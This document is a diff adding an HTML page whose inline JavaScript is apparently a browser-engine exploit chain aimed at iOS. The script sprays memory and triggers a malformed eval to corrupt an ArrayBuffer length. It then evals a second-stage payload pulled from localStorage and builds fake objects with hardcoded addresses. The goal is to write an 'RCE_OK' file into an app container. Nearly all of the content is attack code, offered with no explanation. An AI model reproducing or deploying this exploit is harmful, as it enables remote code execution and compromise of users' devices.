@@ -1,0 +1,46 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<div id="v">X</div>
+<script>"use strict";
+var N=3000,H=150,HN=64,VK=598;
+var PAT=[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255];
+if (globalThis.PAT !== PAT) {
+  globalThis.RESULT="RESULT NO_TOPS";
+  try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+} else {
+var S=new Array(N),fb=new Uint8Array(40);
+for(var j=0;j<40;j++)fb[j]=PAT[j];
+for(var i=0;i<N;i++){var u=new Uint8Array(957);S[i]=u;}
+for(var k=0;k<HN;k++)S[H+k]=null;
+globalThis.f=(0,eval)('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; })');
+var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
+var TN=600,T=new Array(TN),TV=new Array(TN);
+for(var i=0;i<TN;i++){T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}
+var PH=[4,12,20,28,36],VKS=[598,598-10,598-20,598-30,598-40];
+var UB=new Uint8Array(2048);for(var j=0;j<2048;j++)UB[j]=0;UB[0x400]=0x88;UB[0x401]=0x77;UB[0x402]=0x66;UB[0x403]=0x55;UB[0x404]=0x44;UB[0x405]=0x33;UB[0x406]=0x22;UB[0x407]=0x11;globalThis.UB=UB;
+var hit=-1,len=0,ph=-1,vk=-1,nt=0;
+for(var pi=0;pi<5&&hit<0;pi++){
+  var p=PH[pi];
+  for(var i=0;i<N;i++){if(S[i]){for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}
+  for(var vi=0;vi<5&&hit<0;vi++){
+    var v=VKS[vi]; if(v<16) continue;
+    for(var r=0;r<8;r++){var j=v-2*r;T[j]=null;TV[j]=null;}
+    try{f();}catch(e){}
+    nt++;
+    for(var i=0;i<TN;i++){if(T[i]!==null&&T[i].byteLength!==72){hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}
+  }
+}
+if(hit>=0){globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}
+globalThis.RESULT="RESULT LS C=34 SZ=957 N=3000 H=150 HN=64 HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
+globalThis.N1MARK=globalThis.RESULT;
+try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+try{console.log("N1A:"+globalThis.RESULT);}catch(e){}
+var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}
+globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);
+if(hit>=0 && s2){
+ try{s2=s2.replace('i("IOS_N1_OK','globalThis.R=_;globalThis.W=h;globalThis.D=b;globalThis.U=d;globalThis.F=S;globalThis.B=T;globalThis.Y=y;globalThis.X=a;globalThis.M=i;globalThis.K=c;globalThis.N=ABV;globalThis.G=O;i("IOS_N1_OK');(0,eval)(s2);}catch(e2){}
+ try{if(globalThis.U){!function(){var f=B,n=(F,globalThis.U),r=D,i=R,t=(W,Y,X),a=M,o=(K,N,G,f+0x3292cn),e=f+0x172d96cn,x=f+0x628a2cn;function c(f,n,r){for(var i,t=(i=r,BigInt.asUintN(64,i)),a=0;a<8;a++)f[n+a]=Number(t>>BigInt(8*a)&0xffn)}var v=0x1122334455667788n,g=globalThis.UB;if(g){c(g,1024,v);var I,l=0n;for(I=r;I<r+65536n;I+=8n){if(2048n===(0xffffffffn&i(I))){var U=i(I+16n),s=0x00ffffffffffffffn&U;if(s>0x10000n&&s<0x0001000000000000n&&0n===(7n&U))try{if(i(U+0x400n)===v){l=U;break}}catch(f){}}}if(0n===l)for(I=r-8n;I>r-65536n;I-=8n){if(2048n===(0xffffffffn&i(I))){var C=i(I+16n),b=0x00ffffffffffffffn&C;if(b>0x10000n&&b<0x0001000000000000n&&0n===(7n&C))try{if(i(C+0x400n)===v){l=C;break}}catch(f){}}}if(0n!==l){for(var h='/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt',u='RCE_OK\n',A=H(103),T=H(A+7+1),_=T+64,d=_+64,m=d+64,p=m+64,y=0;y<p;y++)g[y]=0;for(var O=0;O<102;O++)g[0+O]=255&h.charCodeAt(O);for(var k=0;k<7;k++)g[A+k]=255&u.charCodeAt(k);g[T+16]=1,g[T+17]=6,g[T+24]=164,g[T+25]=1,c(g,_+40,l+BigInt(0)),c(g,d+16,l+BigInt(A)),g[d+24]=7;for(var E=new Uint8Array(4096),w=0;w<4096;w++)E[w]=0;c(E,8,l+BigInt(_)),c(E,16,e),c(E,24,l+BigInt(T)),c(E,184,l+BigInt(_)),c(E,208,17592880937292n),c(E,224,x),c(E,240,e),c(E,248,l+BigInt(d)),c(E,272,o),c(E,416,17592880936760n),c(E,448,o),c(E,584,l+BigInt(m)),c(E,608,17593429763188n),c(E,624,x),a('U_RDY '+t(l)+' D='+t(r)+' DL='+t(l>r?l-r:r-l)+' O='+(I>r?'+':'-')+t(I>r?I-r:r-I)+' RT='+t(n)+' PATH='+h)}else a('U_NF D='+t(r))}else a('U_NOUB');function H(f){return f+7&-8}}();}}catch(e3){}
+}
+
+}
+</script>
+</body></html>
